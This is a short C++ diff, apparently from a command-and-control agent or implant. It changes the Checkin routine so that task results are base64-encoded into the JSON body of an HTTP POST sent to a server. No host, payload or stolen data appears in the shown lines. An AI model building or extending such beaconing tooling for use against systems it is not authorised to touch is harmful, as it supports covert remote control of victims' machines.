@@ -38,7 +38,7 @@ void HTTPCommunicationModule::Checkin(){
 
 	//Get TaskResults
 	std::vector<TaskResult> results = agent.getTaskResults();
-	std::string data = "{\"results\":" + arrayTaskResult2json(results) + "}";
+	std::string data = "{\"results\":\"" + base64_encode(arrayTaskResult2json(results)) + "\"}";
 
 	std::cout << "Request Body: " << data << std::endl;
 	//Send POST request with Results
